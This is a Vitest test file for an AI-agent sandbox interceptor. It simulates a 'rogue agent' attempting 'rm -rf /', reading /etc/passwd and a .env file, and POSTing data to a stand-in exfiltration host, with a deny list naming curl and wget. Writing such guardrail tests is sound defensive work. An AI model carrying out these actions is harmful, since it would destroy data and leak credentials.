import { describe, it, expect, vi } from "vitest";
import { actionInterceptor } from "../../sandbox/action-interceptor";
import { ActionAttempt, type AgentPermissionScope } from "@guardrail/core";

const { simulatedAgentScope } = vi.hoisted(() => {
  const scope: AgentPermissionScope = {
    filesystem: {
      operations: ["read", "write"],
      allowedPaths: ["/app/workspace/*"],
      deniedPaths: ["/etc/*", "/var/*", "**/.env"],
      maxFileSize: 1024 * 1024,
    },
    network: {
      maxRequests: 10,
      allowedDomains: ["api.github.com", "registry.npmjs.org"],
      deniedDomains: ["malicious.com"],
      allowedProtocols: ["https"],
    },
    shell: {
      allowedCommands: ["npm install", "git status", "ls"],
      deniedCommands: ["rm -rf", "curl", "wget", "chmod"],
      requireConfirmation: [],
      allowEnvironmentVariables: false,
    },
    resources: {
      maxMemoryMB: 512,
      maxCpuPercent: 50,
      maxTokens: 100000,
      maxExecutionTimeMs: 60000,
    },
  };
  return { simulatedAgentScope: scope };
});

// Mock the permission manager to simulate a standard agent
vi.mock("../../sandbox/permission-manager", () => ({
  permissionManager: {
    isAgentActive: vi.fn().mockResolvedValue(true),
    getPermissions: vi.fn().mockResolvedValue(simulatedAgentScope),
  },
}));

describe("🛡️ Rogue Agent Simulation Suite", () => {
  const AGENT_ID = "simulated-rogue-agent-007";
  const TASK_ID = "mission-impossible";

  console.log("\n🤖 Starting Rogue Agent Simulation...");

  it("should BLOCK catastrophic filesystem destruction (rm -rf)", async () => {
    console.log("   💥 Attempting to delete root directory...");

    const action: ActionAttempt = {
      agentId: AGENT_ID,
      taskId: TASK_ID,
      actionType: "shell",
      category: "shell",
      details: {
        command: "rm",
        args: ["-rf", "/"],
      },
    };

    const decision = await actionInterceptor.intercept(action);

    expect(decision.allowed).toBe(false);
    expect(decision.riskLevel).toBe("CRITICAL");
    expect(decision.reason).toContain("explicitly denied");

    console.log(
      '   ✅ BLOCKED: "rm -rf /" was intercepted. Risk Level: CRITICAL',
    );
  });

  it("should BLOCK access to sensitive system files", async () => {
    console.log("   🕵️ Attempting to read /etc/passwd...");

    const action: ActionAttempt = {
      agentId: AGENT_ID,
      taskId: TASK_ID,
      actionType: "read_file",
      category: "file",
      details: {
        operation: "read",
        path: "/etc/passwd",
      },
    };

    const decision = await actionInterceptor.intercept(action);

    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("denied");

    console.log("   ✅ BLOCKED: Access to /etc/passwd denied.");
  });

  it("should BLOCK exfiltration to unknown domains", async () => {
    console.log("   📡 Attempting data exfiltration to evil-corp.com...");

    const action: ActionAttempt = {
      agentId: AGENT_ID,
      taskId: TASK_ID,
      actionType: "network_request",
      category: "network",
      details: {
        method: "POST",
        url: "https://evil-corp.com/exfiltrate",
      },
    };

    const decision = await actionInterceptor.intercept(action);

    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain("denied");

    console.log(
      "   ✅ BLOCKED: Network request to unauthorized domain intercepted.",
    );
  });

  it("should ALLOW safe, authorized actions", async () => {
    console.log('   👍 Attempting safe "npm install"...');

    const action: ActionAttempt = {
      agentId: AGENT_ID,
      taskId: TASK_ID,
      actionType: "shell",
      category: "shell",
      details: {
        command: "npm",
        args: ["install"],
      },
    };

    const decision = await actionInterceptor.intercept(action);

    expect(decision.allowed).toBe(true);

    console.log("   ✅ ALLOWED: Authorized command proceeded normally.");
  });

  it("should BLOCK attempts to read .env files", async () => {
    console.log("   🔑 Attempting to steal secrets from .env...");

    const action: ActionAttempt = {
      agentId: AGENT_ID,
      taskId: TASK_ID,
      actionType: "read_file",
      category: "file",
      details: {
        operation: "read",
        path: "/app/workspace/.env",
      },
    };

    const decision = await actionInterceptor.intercept(action);

    expect(decision.allowed).toBe(false);

    console.log("   ✅ BLOCKED: Access to .env file intercepted.");
  });
});
